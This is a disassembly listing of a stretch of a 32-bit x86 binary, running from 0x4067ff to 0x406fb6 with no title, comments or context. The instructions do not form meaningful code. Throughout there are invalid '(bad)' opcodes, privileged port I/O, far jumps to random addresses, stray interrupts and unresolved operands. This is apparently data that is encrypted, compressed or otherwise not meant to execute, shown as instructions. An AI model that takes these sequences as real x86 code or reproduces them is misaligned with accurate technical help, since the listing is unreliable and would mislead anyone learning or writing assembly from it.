  4067ff:	mov    ah,BYTE PTR [esi-0xc70a94a]
  406805:	jg     0x406808
  406807:	sub    ebp,0x86c9ed49
  40680d:	adc    DWORD PTR [eax-0x13],ecx
  406810:	fst    QWORD PTR [eax-0x2d8f77f7]
  406816:	(bad)  
  406817:	dec    ebp
  406818:	shl    BYTE PTR [esi-0x256d943a],0xe8
  40681f:	and    DWORD PTR [esi],ebx
  406821:	xlat   BYTE PTR ds:[ebx]
  406822:	inc    eax
  406823:	dec    edx
  406824:	repz pop DWORD PTR [ebp+0x5c]
  406828:	sbb    esp,DWORD PTR [eax+0x251315c1]
  40682e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40682f:	arpl   WORD PTR [eax+0x55],bp
  406832:	push   cs
  406833:	dec    ecx
  406834:	push   ebp
  406835:	sbb    bh,dl
  406837:	loop   0x4067c4
  406839:	or     eax,0xf1628276
  40683e:	cdq    
  40683f:	stos   BYTE PTR es:[edi],al
  406840:	cmc    
  406841:	ins    BYTE PTR es:[edi],dx
  406842:	fcomip st,st(5)
  406844:	arpl   WORD PTR [eax-0x474513ff],di
  40684a:	cmp    eax,0x13a5f58a
  40684f:	mov    ecx,DWORD PTR [eax-0x45]
  406852:	mov    eax,ds:0x28f90d03
  406857:	sbb    dh,bl
  406859:	push   ecx
  40685a:	lea    eax,[ecx+edi*2]
  40685d:	(bad)  
  40685e:	out    dx,al
  40685f:	pop    esi
  406860:	mov    eax,0x534119bb
  406865:	dec    esp
  406866:	stos   BYTE PTR es:[edi],al
  406867:	jo     0x4068d0
  406869:	jnp    0x4068d9
  40686b:	or     edi,DWORD PTR [ebp-0x117be0a5]
  406871:	imul   ebp,DWORD PTR [esi+0x22],0x9bce7011
  406878:	dec    esi
  406879:	addr16 (bad) 
  40687b:	loopne 0x40685f
  40687d:	jb     0x4068a9
  40687f:	push   ds
  406880:	stc    
  406881:	(bad)  
  406882:	fisttp WORD PTR [edi-0x41df2e6d]
  406888:	bound  eax,QWORD PTR [eax]
  40688a:	mov    ?,WORD PTR ss:[ecx-0x63]
  40688e:	nop
  40688f:	icebp  
  406890:	ja     0x4068dd
  406892:	jae    0x4068f5
  406894:	cdq    
  406895:	jae    0x4068f4
  406897:	push   esp
  406898:	mov    al,ds:0x8ee9317c
  40689d:	mov    esp,0xcf2c5284
  4068a2:	inc    esp
  4068a3:	adc    bl,dl
  4068a5:	add    DWORD PTR [ebp+0x7609df91],ecx
  4068ab:	inc    ebx
  4068ac:	(bad)  [ecx+0x5353c5d1]
  4068b2:	rol    BYTE PTR [ecx+0x7ad09366],cl
  4068b8:	sbb    eax,0x4c4618da
  4068bd:	push   0x90566669
  4068c2:	and    DWORD PTR [ebp-0x1183a19b],ebx
  4068c8:	sbb    ebx,DWORD PTR [esi]
  4068ca:	int    0xd5
  4068cc:	pcmpgtd mm3,QWORD PTR [ebp+edi*1+0x1c]
  4068d1:	js     0x40693d
  4068d3:	out    dx,eax
  4068d4:	(bad)  
  4068d6:	inc    edx
  4068d7:	dec    esp
  4068d8:	mov    bl,0x23
  4068da:	stc    
  4068db:	sti    
  4068dc:	test   DWORD PTR [edx+0x43],eax
  4068df:	xchg   edi,eax
  4068e0:	lds    ecx,FWORD PTR [esi+eax*4]
  4068e3:	fst    DWORD PTR [eax-0x1f]
  4068e6:	jg     0x4068e2
  4068e8:	cwde   
  4068e9:	sub    DWORD PTR [ebp+0xb],ebp
  4068ec:	cdq    
  4068ed:	ret    0x1c46
  4068f0:	jne    0x4068d8
  4068f2:	sub    eax,DWORD PTR [edi]
  4068f4:	test   BYTE PTR [ebx+edx*2],ch
  4068f7:	xor    ecx,ebx
  4068f9:	test   BYTE PTR [ebx+0x1f6147f7],dl
  4068ff:	or     ebx,esi
  406901:	in     eax,dx
  406902:	fcmovb st,st(4)
  406904:	push   eax
  406905:	xchg   ebp,eax
  406906:	aad    0xdb
  406908:	mov    ch,bh
  40690a:	inc    esp
  40690b:	lods   al,BYTE PTR ds:[esi]
  40690c:	push   cs
  40690d:	inc    BYTE PTR [ecx-0x464f39b6]
  406913:	aaa    
  406914:	push   ss
  406915:	iret   
  406916:	call   DWORD PTR [ebp+ebx*2+0x60]
  40691a:	sbb    esi,esp
  40691c:	jo     0x406996
  40691e:	jp     0x406975
  406920:	mov    bh,0xa0
  406922:	pop    es
  406923:	sub    BYTE PTR [ecx+esi*8-0x80],bh
  406927:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  406929:	ins    BYTE PTR es:[edi],dx
  40692a:	jae    0x40698d
  40692c:	lods   al,BYTE PTR ds:[esi]
  40692d:	sbb    edi,DWORD PTR [ebp+0x7a57cd6f]
  406933:	lea    esp,[ecx-0x4ebe7cb5]
  406939:	in     eax,dx
  40693a:	into   
  40693b:	ficomp WORD PTR [edx]
  40693d:	js     0x40698b
  40693f:	push   0x81369404
  406944:	jo     0x406932
  406946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406947:	jle    0x40696e
  406949:	in     al,0x95
  40694b:	jg     0x4069b7
  40694d:	(bad)  
  40694e:	push   edx
  40694f:	push   ss
  406950:	sub    al,0x5e
  406952:	int3   
  406953:	iret   
  406954:	test   DWORD PTR [ecx+esi*4-0x1e],esp
  406958:	(bad)  
  406959:	dec    ecx
  40695a:	sbb    eax,DWORD PTR [edx+0x21e817c5]
  406960:	arpl   WORD PTR [ebp-0x6b],di
  406963:	mov    eax,ds:0xf37567c6
  406968:	xchg   ebp,eax
  40696a:	nop
  40696b:	cmp    DWORD PTR cs:[eax],0xf0395ddc
  406972:	loope  0x406907
  406974:	xor    al,0xc6
  406976:	sub    eax,0x2de3fe8d
  40697b:	and    al,0x91
  40697d:	fldenv [esp+eax*8+0x3f602e31]
  406984:	enter  0x2c52,0x73
  406988:	lods   al,BYTE PTR ds:[esi]
  406989:	push   ebx
  40698a:	xchg   edx,eax
  40698b:	test   eax,0x470ee603
  406990:	dec    edx
  406991:	test   eax,0xa23dc9b2
  406996:	jge    0x4069ac
  406998:	cmp    DWORD PTR [edx-0x25],edx
  40699b:	pop    ebx
  40699c:	lea    esp,[edx+0x239a469a]
  4069a2:	and    DWORD PTR [esi+0x45],eax
  4069a5:	dec    ebx
  4069a6:	icebp  
  4069a7:	fimul  WORD PTR [ebp+eax*1-0x4f9d3cd2]
  4069ae:	retf   0xe3ba
  4069b1:	fisttp DWORD PTR [esi-0x2e50a95b]
  4069b7:	je     0x406a0f
  4069b9:	pop    edx
  4069ba:	xchg   BYTE PTR [esi],dh
  4069bc:	cs push ss
  4069be:	hlt    
  4069bf:	mov    BYTE PTR [esi],bl
  4069c1:	retf   
  4069c2:	dec    ecx
  4069c3:	mov    esi,0xd39ef8db
  4069c8:	std    
  4069c9:	ficom  DWORD PTR [edi+ebx*1-0x27]
  4069cd:	adc    esp,DWORD PTR [eax]
  4069cf:	xchg   ebx,eax
  4069d0:	je     0x406a38
  4069d2:	scas   eax,DWORD PTR es:[edi]
  4069d3:	fcomp  QWORD PTR [ebx+0x504e7497]
  4069d9:	jne    0x406991
  4069db:	ins    DWORD PTR es:[edi],dx
  4069dc:	adc    BYTE PTR [edi],ah
  4069de:	es loop 0x4069cf
  4069e1:	mov    ebp,0xc5afe180
  4069e6:	sub    bh,BYTE PTR [eax-0x759e12e9]
  4069ec:	fcos   
  4069ee:	inc    esi
  4069ef:	ins    BYTE PTR es:[edi],dx
  4069f0:	sbb    ebp,ebx
  4069f2:	mov    ah,0x33
  4069f4:	or     eax,0x23a91499
  4069f9:	xchg   ecx,eax
  4069fa:	mov    edi,0x7905bec5
  4069ff:	icebp  
  406a00:	pop    ds
  406a01:	lahf   
  406a02:	dec    ebx
  406a03:	shl    BYTE PTR [ebx-0x5267c2e8],1
  406a09:	fisub  WORD PTR [ecx+0x34]
  406a0c:	out    0x20,eax
  406a0e:	mov    eax,0x107d1dde
  406a13:	dec    ebx
  406a14:	fidiv  WORD PTR [ebx]
  406a16:	push   es
  406a17:	push   eax
  406a18:	pop    es
  406a19:	std    
  406a1a:	aas    
  406a1b:	sub    DWORD PTR [eax+eiz*2+0x5a9ad7c8],edx
  406a22:	and    ch,BYTE PTR [ecx+0x79]
  406a25:	xacquire xchg DWORD PTR [ebp-0x3a],ecx
  406a29:	xlat   BYTE PTR ds:[ebx]
  406a2a:	retf   0xc2df
  406a2d:	cmp    al,0x10
  406a2f:	pop    edx
  406a30:	mov    bh,BYTE PTR [eax+0x32]
  406a33:	sbb    edx,ebx
  406a35:	fwait
  406a36:	sub    BYTE PTR es:[eax+0x50],bh
  406a3a:	jne    0x4069ef
  406a3c:	mov    eax,0x25d74c93
  406a41:	jne    0x406a33
  406a43:	out    0x80,eax
  406a45:	mov    ch,0xdc
  406a47:	jmp    0x406ab9
  406a49:	inc    edi
  406a4a:	adc    ebx,DWORD PTR [edx-0x3a997bff]
  406a50:	sbb    ebx,edx
  406a52:	dec    esp
  406a53:	js     0x406a4b
  406a55:	test   BYTE PTR [eax-0x2fdb701e],0xbb
  406a5c:	aam    0x8f
  406a5e:	add    dl,BYTE PTR [edi]
  406a60:	les    edx,FWORD PTR ds:0x76e21cf1
  406a66:	pop    ds
  406a67:	adc    BYTE PTR [ebx+0x5c],0xb5
  406a6b:	imul   ebx,edi,0xffffffaf
  406a6e:	int    0x7a
  406a70:	bound  eax,QWORD PTR [ebx+0x7d]
  406a73:	mov    BYTE PTR [ebx-0x48],cl
  406a76:	push   ebx
  406a77:	(bad)  
  406a78:	clc    
  406a79:	outs   dx,BYTE PTR ds:[esi]
  406a7a:	rcr    bh,0xd6
  406a7d:	add    al,0x1
  406a7f:	std    
  406a80:	dec    eax
  406a81:	adc    dh,BYTE PTR [esi-0x1bd65d64]
  406a87:	popa   
  406a88:	push   0xffffffea
  406a8a:	scas   al,BYTE PTR es:[edi]
  406a8b:	(bad)  
  406a8c:	(bad)  
  406a8e:	xchg   BYTE PTR [edi+edx*1+0x69],al
  406a92:	mov    dl,0xf4
  406a94:	(bad)  
  406a95:	pop    ebx
  406a96:	push   esi
  406a97:	scas   al,BYTE PTR es:[edi]
  406a98:	xor    eax,0x97de0efd
  406a9d:	imul   esp,DWORD PTR [esi],0x13f4d36c
  406aa3:	test   al,0x4
  406aa5:	xor    BYTE PTR [ebx-0x3e],0x4b
  406aa9:	mov    ecx,0x1b38463c
  406aae:	popa   
  406aaf:	cmc    
  406ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab1:	xor    al,0xee
  406ab3:	xor    BYTE PTR [ecx+ebx*2],0xfb
  406ab7:	scas   eax,DWORD PTR es:[edi]
  406ab8:	ja     0x406b23
  406aba:	test   eax,0x9b98917
  406abf:	loope  0x406ac7
  406ac1:	aam    0xc8
  406ac3:	adc    ch,al
  406ac5:	or     edx,DWORD PTR [edi]
  406ac7:	adc    ch,BYTE PTR [edx-0x4d]
  406aca:	les    esi,FWORD PTR [esi]
  406acc:	add    eax,DWORD PTR [edx-0x21762ad3]
  406ad2:	push   eax
  406ad3:	aam    0x9b
  406ad5:	(bad)  [edi-0x55]
  406ad8:	add    ah,dh
  406ada:	jae    0x406b1b
  406adc:	push   ds
  406add:	pop    ebx
  406ade:	or     eax,0x1714c6dd
  406ae3:	pop    esp
  406ae4:	mov    cl,bl
  406ae6:	jmp    0xcd90:0xd734e58
  406aed:	fnstsw WORD PTR [ebx-0x364aa785]
  406af3:	bound  esi,QWORD PTR [esi+esi*2]
  406af6:	mov    DWORD PTR [ebp-0xd],ecx
  406af9:	jecxz  0x406b53
  406afb:	rcl    DWORD PTR [eax+0x6235f4d6],1
  406b01:	add    eax,0x9cb1c8f6
  406b06:	xor    eax,0xddb5bba1
  406b0b:	outs   dx,BYTE PTR ds:[esi]
  406b0c:	inc    edi
  406b0d:	sub    ch,bh
  406b0f:	repnz dec edi
  406b11:	pop    edx
  406b12:	call   0x7b5c8865
  406b17:	fs mov cl,0xe5
  406b1a:	or     dh,dh
  406b1c:	xor    al,dl
  406b1e:	retf   
  406b1f:	sbb    DWORD PTR [esi],edi
  406b21:	repz add DWORD PTR [esi+0x728dd8e1],esi
  406b28:	dec    esi
  406b29:	mov    ah,0x9c
  406b2b:	sub    bh,BYTE PTR [eax-0x3570b849]
  406b31:	idiv   BYTE PTR [edx+0x7385bbe9]
  406b37:	dec    eax
  406b38:	inc    esi
  406b39:	mov    eax,0x3e49c812
  406b3e:	sbb    al,0x6a
  406b40:	xchg   DWORD PTR [ecx],ebx
  406b42:	and    eax,0x5144db75
  406b47:	dec    esp
  406b48:	mov    BYTE PTR [eax],al
  406b4a:	data16 jge 0x406af9
  406b4d:	in     al,dx
  406b4e:	adc    eax,0x9744edad
  406b53:	mov    esp,0x4ed3b37c
  406b58:	ins    DWORD PTR es:[edi],dx
  406b59:	mov    al,ds:0x661e462
  406b5e:	(bad)  
  406b5f:	in     eax,0xe0
  406b61:	xchg   esp,eax
  406b62:	push   eax
  406b63:	jle    0x406ae9
  406b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b66:	retf   
  406b67:	sar    DWORD PTR [ecx-0x72],1
  406b6a:	test   eax,0x8acc1518
  406b6f:	(bad)  
  406b70:	sub    eax,0xe6ec97b7
  406b75:	xchg   edx,eax
  406b76:	cdq    
  406b77:	mov    ds:0x6cfd57c1,al
  406b7c:	call   0x4715:0xa0f90b7
  406b83:	shl    DWORD PTR [edi],0x15
  406b86:	jmp    0x406bf0
  406b88:	daa    
  406b89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b8a:	pushf  
  406b8b:	rcr    BYTE PTR [esp+edx*1+0xb],1
  406b8f:	mov    ds:0xed167dfb,eax
  406b94:	das    
  406b95:	cld    
  406b96:	mov    ah,0x37
  406b98:	div    BYTE PTR [edx+0x9e99ef5]
  406b9e:	addr16 sti 
  406ba0:	sti    
  406ba1:	or     eax,DWORD PTR [edi-0x4b413980]
  406ba7:	clc    
  406ba8:	imul   esp,DWORD PTR [ecx+0x5b],0xb4536d2b
  406baf:	mov    cl,0xe5
  406bb1:	push   es
  406bb2:	mov    cs,esi
  406bb4:	xchg   edi,eax
  406bb5:	mov    edi,0x5a4ac9ea
  406bba:	scas   al,BYTE PTR es:[edi]
  406bbb:	mov    WORD PTR [edi],cs
  406bbd:	mov    al,ds:0xae8b2feb
  406bc2:	or     al,BYTE PTR [edx-0xb502482]
  406bc8:	xchg   ecx,eax
  406bc9:	(bad)  
  406bca:	lock adc eax,0xf8d2c945
  406bd0:	test   eax,0x7bb95282
  406bd5:	imul   edi,DWORD PTR [edx+edi*4+0xb],0x618fbda
  406bdd:	mov    edx,0x7e561375
  406be2:	pop    ds
  406be3:	xchg   DWORD PTR [eax+0x74],ebx
  406be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406be8:	test   eax,0xa85cc952
  406bed:	int    0x40
  406bef:	add    al,0xd9
  406bf1:	mov    ch,0xdd
  406bf3:	addr16 call 0x467d3b92
  406bf9:	(bad)  
  406bfa:	stos   BYTE PTR es:[edi],al
  406bfb:	jo     0x406c47
  406bfd:	gs and ebp,ebx
  406c00:	out    dx,eax
  406c01:	aas    
  406c02:	es push cs
  406c04:	daa    
  406c05:	pop    ebx
  406c06:	out    0x5c,al
  406c08:	mov    dh,0x7
  406c0a:	cmp    BYTE PTR [ebx+0x61],0x2c
  406c0e:	and    al,0x31
  406c10:	sahf   
  406c11:	mov    edx,0xe2ce3f3d
  406c16:	les    esi,FWORD PTR ds:0xd7d63888
  406c1c:	mov    cl,0x1e
  406c1e:	add    ch,BYTE PTR [esi]
  406c20:	nop
  406c21:	rcl    DWORD PTR [esi+edx*4],0xdb
  406c25:	inc    ebp
  406c26:	aam    0x30
  406c28:	nop
  406c29:	in     eax,0xad
  406c2b:	cmp    eax,0xe9afa276
  406c30:	pop    edx
  406c31:	cmp    eax,0x51349fe
  406c36:	lahf   
  406c37:	mov    WORD PTR [esi+edi*2],es
  406c3a:	bound  esp,QWORD PTR [esi-0x26506ed1]
  406c40:	fmul   st(5),st
  406c42:	push   ds
  406c43:	retf   
  406c44:	xchg   edx,eax
  406c45:	out    0xe6,al
  406c47:	add    DWORD PTR [eax],esi
  406c49:	scas   al,BYTE PTR es:[edi]
  406c4a:	ret    
  406c4b:	arpl   WORD PTR [esi-0x3cf2fb89],ax
  406c51:	rcl    edi,0x29
  406c54:	push   ebp
  406c55:	shl    edx,cl
  406c57:	or     esi,eax
  406c59:	inc    ebx
  406c5a:	pop    ebp
  406c5b:	idiv   ah
  406c5d:	(bad)  
  406c5e:	xlat   BYTE PTR ds:[ebx]
  406c5f:	ret    
  406c60:	sub    BYTE PTR [esi+edi*8+0x1532344a],0x7
  406c68:	xchg   BYTE PTR [ebp-0x29e14c73],dl
  406c6e:	int3   
  406c6f:	icebp  
  406c70:	pop    eax
  406c71:	xchg   ecx,eax
  406c72:	test   bh,bl
  406c74:	inc    ebx
  406c75:	stc    
  406c76:	inc    DWORD PTR [edi+0x6cd313a3]
  406c7c:	mov    gs,WORD PTR [esi]
  406c7e:	xor    eax,DWORD PTR [ecx+0x43df03ac]
  406c84:	je     0x406c5e
  406c86:	push   0x12
  406c88:	int3   
  406c89:	add    DWORD PTR [edi+0x1d31864f],0x7
  406c90:	daa    
  406c91:	sti    
  406c92:	adc    bl,bl
  406c94:	and    BYTE PTR [edx-0x20],cl
  406c97:	fidivr WORD PTR cs:[ebx-0x60e0ea19]
  406c9e:	fcomp  DWORD PTR [edx+esi*8+0x30]
  406ca2:	or     al,0x7d
  406ca4:	bound  edx,QWORD PTR [ebx+0x4f]
  406ca7:	push   esp
  406ca8:	lods   eax,DWORD PTR ds:[esi]
  406ca9:	dec    ebp
  406caa:	push   eax
  406cab:	gs aam 0x22
  406cae:	dec    ebx
  406caf:	(bad)  
  406cb0:	pop    edx
  406cb1:	jmp    0x62feaaf0
  406cb6:	mov    ebx,0x9c9f8179
  406cbb:	and    al,0xb9
  406cbd:	stos   BYTE PTR es:[edi],al
  406cbe:	pop    es
  406cbf:	sub    ah,BYTE PTR [ebx-0x74]
  406cc2:	std    
  406cc3:	mov    ah,0x84
  406cc5:	(bad)  
  406cc6:	mov    ecx,0x5647afdb
  406ccb:	gs enter 0xd94a,0x35
  406cd0:	jne    0x406c9e
  406cd2:	jl     0x406d24
  406cd4:	jmp    0xb5d4:0x46e0352
  406cdb:	scas   eax,DWORD PTR es:[edi]
  406cdc:	out    0x60,al
  406cde:	gs xchg edi,eax
  406ce0:	test   BYTE PTR [edx-0x6f],0x8b
  406ce4:	adc    ebp,DWORD PTR [eax-0x63a3e57e]
  406cea:	sub    BYTE PTR [ecx+eax*2+0x44],dl
  406cee:	not    DWORD PTR [esi-0x6c]
  406cf1:	pop    ds
  406cf2:	aas    
  406cf3:	sbb    al,0x8b
  406cf6:	inc    eax
  406cf7:	adc    DWORD PTR [edx*2+0x4ac0ed67],ebx
  406cfe:	mov    ecx,0x201a3473
  406d03:	fisub  DWORD PTR [ecx-0x1c]
  406d06:	jmp    0xaab9:0xb58d7041
  406d0d:	sbb    al,0x47
  406d0f:	sbb    eax,DWORD PTR [ebx+0x3b]
  406d12:	mov    esp,0x2882abf5
  406d17:	out    dx,al
  406d18:	inc    ecx
  406d19:	mov    ecx,0x7d6c7268
  406d1e:	mov    edx,0x97c38128
  406d23:	ss dec ecx
  406d25:	stc    
  406d26:	push   ds
  406d27:	stos   DWORD PTR es:[edi],eax
  406d28:	pop    edi
  406d29:	mov    fs,WORD PTR [eax-0x5c]
  406d2c:	shl    BYTE PTR [esi],1
  406d2e:	jge    0x406d21
  406d30:	ds xchg ebp,eax
  406d32:	ret    
  406d33:	cmp    edi,edi
  406d35:	mov    ds:0x82aba1c6,eax
  406d3a:	jnp    0x406d42
  406d3c:	ins    DWORD PTR es:[edi],dx
  406d3d:	lahf   
  406d3e:	dec    esp
  406d3f:	fnstcw WORD PTR [edx]
  406d41:	ret    
  406d42:	psrlq  mm2,mm2
  406d45:	add    DWORD PTR [edx+eax*8],ecx
  406d48:	jge    0x406d17
  406d4a:	loopne 0x406d5c
  406d4c:	push   eax
  406d4d:	mov    eax,ds:0xfe92a99
  406d52:	outs   dx,BYTE PTR ds:[esi]
  406d53:	stos   DWORD PTR es:[edi],eax
  406d54:	test   al,0xe0
  406d56:	dec    edx
  406d57:	repnz test al,0x18
  406d5a:	fild   QWORD PTR es:[edi+0x2f]
  406d5e:	loopne 0x406dc3
  406d60:	mov    dl,BYTE PTR [ebp-0x74c4689]
  406d66:	jecxz  0x406d83
  406d68:	cmp    BYTE PTR [edx-0x2f],0x72
  406d6c:	aas    
  406d6d:	adc    esi,edx
  406d6f:	or     edx,DWORD PTR ds:0x6d90cd94
  406d75:	inc    esi
  406d76:	push   cs
  406d77:	cmp    al,0xdc
  406d79:	adc    eax,0x6c1dca7
  406d7e:	jl     0x406d23
  406d80:	pop    ecx
  406d81:	pop    ss
  406d82:	hlt    
  406d83:	push   esp
  406d84:	cmp    al,0xb8
  406d86:	pop    eax
  406d87:	ins    DWORD PTR es:[edi],dx
  406d88:	(bad)  
  406d89:	std    
  406d8a:	mov    ebp,DWORD PTR [eax+eiz*8+0x4bc9f1fb]
  406d91:	jge    0x406df3
  406d93:	jg     0x406dfb
  406d95:	push   0x104ac645
  406d9a:	jne    0x406d66
  406d9c:	fiadd  DWORD PTR [ebx-0x57]
  406d9f:	add    DWORD PTR [ecx-0x6f0b0d2a],eax
  406da5:	retf   0x70b4
  406da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406da9:	lock pop eax
  406dab:	dec    eax
  406dac:	xchg   esp,eax
  406dad:	aas    
  406dae:	test   DWORD PTR [ebx],edx
  406db0:	leave  
  406db1:	cmp    dl,BYTE PTR [esp+ebx*1]
  406db4:	pop    esi
  406db5:	stos   BYTE PTR es:[edi],al
  406db6:	cld    
  406db7:	jmp    0x4cffece3
  406dbc:	cdq    
  406dbd:	sbb    BYTE PTR [eax-0x3f20a0a2],bh
  406dc3:	je     0x406e35
  406dc5:	and    BYTE PTR [ebp+0x7e4cf9f1],ch
  406dcb:	push   edx
  406dcc:	fadd   DWORD PTR [edx]
  406dce:	mov    al,ds:0x84140eb1
  406dd3:	test   al,0x7a
  406dd5:	(bad)  
  406dd6:	fwait
  406dd7:	adc    BYTE PTR [edx+0x4f],bl
  406dda:	mov    al,0xc8
  406ddc:	pop    es
  406ddd:	mov    eax,0xb40b3479
  406de2:	(bad)  
  406de3:	pop    eax
  406de4:	jo     0x406df3
  406de6:	ds stos DWORD PTR es:[edi],eax
  406de8:	nop
  406de9:	aaa    
  406dea:	jmp    0x29f8588f
  406def:	stos   DWORD PTR es:[edi],eax
  406df0:	add    DWORD PTR [edx-0x59e23c7b],ebp
  406df6:	mov    esi,0xc01e16ba
  406dfb:	and    eax,0xce6fa509
  406e00:	sbb    eax,0x78ee60ca
  406e05:	and    eax,0x90cede5e
  406e0a:	daa    
  406e0b:	mov    dl,0x71
  406e0d:	imul   esp,DWORD PTR [edi],0x6b1dd828
  406e13:	mov    bl,0xc9
  406e15:	jmp    0x882f16f8
  406e1a:	or     BYTE PTR [esi+ebp*4-0x34f987e8],dh
  406e21:	fisttp DWORD PTR [ebx+0x7f21ad4d]
  406e27:	and    bl,bl
  406e29:	sbb    edx,DWORD PTR [ebp+eax*2-0x262201f0]
  406e30:	leave  
  406e31:	es pop ebp
  406e34:	mov    ch,BYTE PTR [esi+0x6e]
  406e37:	lock mov esi,0xe587911b
  406e3d:	mov    edx,DWORD PTR [edx]
  406e3f:	rcl    dl,0x1e
  406e42:	jp     0x406e69
  406e44:	scas   al,BYTE PTR es:[edi]
  406e45:	xchg   edi,eax
  406e46:	test   DWORD PTR [ebx],esp
  406e48:	iret   
  406e49:	adc    al,0xeb
  406e4b:	dec    ecx
  406e4c:	jg     0x406e47
  406e4e:	fmul   DWORD PTR [esi+0xb]
  406e51:	in     eax,dx
  406e52:	add    eax,0x4c778ddb
  406e57:	xchg   BYTE PTR [edi],bl
  406e59:	push   ebx
  406e5a:	xor    eax,0xee4520bf
  406e5f:	sub    eax,0x1f7ad727
  406e64:	mov    ebp,0x30fd719d
  406e69:	dec    ecx
  406e6a:	cmp    DWORD PTR [edx+0x7fefbf96],edi
  406e70:	xchg   ecx,eax
  406e71:	sbb    al,0xf4
  406e73:	iret   
  406e74:	mov    bl,BYTE PTR [esi-0x70]
  406e77:	push   ecx
  406e78:	pop    ecx
  406e79:	retf   
  406e7a:	int    0x98
  406e7c:	or     cl,ah
  406e7e:	jecxz  0x406e7b
  406e80:	adc    eax,0x9f079f8
  406e85:	dec    edi
  406e86:	jnp    0x406eea
  406e88:	mov    dh,BYTE PTR [esp+esi*4+0x69]
  406e8c:	dec    ecx
  406e8d:	mov    esp,eax
  406e8f:	(bad)  
  406e91:	rol    DWORD PTR [edx-0x2e4f2aca],1
  406e97:	mov    ah,BYTE PTR [eax+0x55]
  406e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e9b:	add    ebx,DWORD PTR [edi+0x2c]
  406e9e:	xchg   esi,eax
  406e9f:	sub    cl,BYTE PTR [ecx-0x70]
  406ea2:	shr    BYTE PTR [eax],0x1e
  406ea5:	int3   
  406ea6:	sub    dl,bh
  406ea8:	sbb    ch,BYTE PTR [esi+0xfa8e6fa]
  406eae:	int3   
  406eaf:	rcr    DWORD PTR [ebp+0x6b],cl
  406eb2:	pop    esp
  406eb3:	or     eax,0xf2abcdbb
  406eb8:	popa   
  406eb9:	cdq    
  406eba:	xlat   BYTE PTR ds:[ebx]
  406ebb:	xchg   edx,eax
  406ebc:	fsub   st(6),st
  406ebe:	in     eax,dx
  406ebf:	pop    ds
  406ec0:	arpl   WORD PTR [ebx+ebp*2],di
  406ec3:	jae    0x406e98
  406ec5:	fsub   QWORD PTR [ecx-0x7ac4cb01]
  406ecb:	jno    0x406ec6
  406ecd:	call   DWORD PTR [ebx+0x7a]
  406ed0:	inc    esi
  406ed1:	cmp    al,0x7d
  406ed3:	sub    DWORD PTR [ebp+0x59],ebp
  406ed6:	retf   0xbe92
  406ed9:	clc    
  406eda:	xor    bh,BYTE PTR [ecx+eax*1]
  406edd:	lds    edx,FWORD PTR [ebx-0x66782b25]
  406ee3:	mov    WORD PTR [ebp+0x6d264e9a],?
  406ee9:	pusha  
  406eea:	stos   BYTE PTR es:[edi],al
  406eeb:	push   0xffffff94
  406eed:	mov    dl,BYTE PTR [edx+0x14fc7f65]
  406ef3:	arpl   WORD PTR [ebx],bp
  406ef5:	or     ah,dh
  406ef7:	cmp    esp,eax
  406ef9:	xchg   edx,eax
  406efa:	sbb    al,0x6
  406efc:	ror    DWORD PTR [ecx+ebx*1+0x6a],0xa2
  406f01:	daa    
  406f02:	out    0x3e,al
  406f04:	lods   eax,DWORD PTR es:[esi]
  406f06:	or     DWORD PTR [eax+0x4f],edx
  406f09:	dec    dx
  406f0b:	mov    edx,0xe0e15c23
  406f10:	bound  edi,QWORD PTR [esp+edi*1]
  406f13:	and    DWORD PTR [esi+0x6a1f29c7],edi
  406f19:	push   esi
  406f1a:	cmp    ebx,ecx
  406f1c:	xor    DWORD PTR [eax-0x7e],edi
  406f1f:	iret   
  406f20:	xor    ch,ah
  406f22:	(bad)  
  406f23:	mov    ch,0x2b
  406f25:	add    eax,0x37d3902
  406f2a:	addr16 dec ebx
  406f2c:	push   eax
  406f2d:	popa   
  406f2e:	rcl    BYTE PTR [ebx+edx*1],1
  406f31:	add    BYTE PTR [ebx],ah
  406f33:	ror    DWORD PTR gs:[edi-0x47],cl
  406f37:	fisubr DWORD PTR [ebx+edi*8]
  406f3a:	add    ecx,eax
  406f3c:	mov    al,ds:0x6695a7fb
  406f41:	jno    0x406f41
  406f43:	stos   DWORD PTR es:[edi],eax
  406f44:	and    dh,BYTE PTR [edx+0x51]
  406f47:	sub    ebx,DWORD PTR [edx]
  406f49:	in     eax,dx
  406f4a:	inc    esp
  406f4b:	xchg   edx,eax
  406f4c:	aaa    
  406f4d:	cmp    esp,DWORD PTR [ebp-0x53faef63]
  406f53:	sub    ebx,DWORD PTR [ecx+0x6b]
  406f56:	mov    bh,0x6a
  406f58:	pushf  
  406f59:	mov    dl,0x80
  406f5b:	(bad)  
  406f5c:	mov    al,ds:0xa0078076
  406f61:	jne    0x406f3e
  406f63:	scas   eax,DWORD PTR es:[edi]
  406f64:	mov    ch,0xa5
  406f66:	pusha  
  406f67:	repz sbb dh,BYTE PTR [edi]
  406f6a:	sahf   
  406f6b:	sub    al,0x88
  406f6d:	cmp    eax,0x5ae97967
  406f72:	jle    0x406fdb
  406f74:	fist   DWORD PTR [esi+0xc30ac21]
  406f7a:	in     al,dx
  406f7b:	xchg   edx,eax
  406f7c:	les    ebp,FWORD PTR [edi]
  406f7e:	adc    BYTE PTR [eax],ah
  406f80:	aas    
  406f81:	fs push esi
  406f83:	ss enter 0x481a,0xb6
  406f88:	fcomp  DWORD PTR [ebp-0x2b6c51cf]
  406f8e:	add    ebp,ecx
  406f90:	pop    esp
  406f91:	bnd jo 0x406f7c
  406f94:	sub    DWORD PTR [edi+ebp*4],ebp
  406f97:	and    DWORD PTR [ecx],esi
  406f99:	sbb    BYTE PTR [ebp-0xc],ch
  406f9c:	stc    
  406f9d:	fdivp  st(6),st
  406f9f:	repz mov bl,0xb3
  406fa2:	push   ecx
  406fa3:	popf   
  406fa4:	retf   
  406fa5:	mov    esi,0xc54ae274
  406faa:	mov    edx,ecx
  406fac:	dec    esp
  406fad:	fadd   QWORD PTR [eax]
  406faf:	cmp    eax,0xde087bd
  406fb4:	out    0xe9,al
  406fb6:	(bad)  
